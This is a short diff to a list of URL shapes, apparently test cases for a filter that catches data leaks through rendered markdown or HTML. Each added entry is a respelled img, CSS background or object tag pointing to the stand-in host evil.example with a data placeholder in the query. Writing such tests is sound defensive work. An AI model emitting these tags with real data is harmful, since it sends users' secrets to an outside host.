@@ -30,6 +30,11 @@ URL_SHAPES = [
     "![x](<https://evil.example/a b?q= {v}>)",
     '<img src="https://evil.example/a b?q= {v}">',
     "<img src=//evil.example/?q={v}>",
+    # r3 MAJOR-r3-1: the reviewer's HTML respellings
+    '<img src\n="http:evil.example/?q={v}">',
+    '<img src\n=\n"http:evil.example/?q={v}">',
+    '<span style="background:url(http:evil.example/?q={v})">',
+    '<object data="http:evil.example/?q={v}">',
 ]
 
 
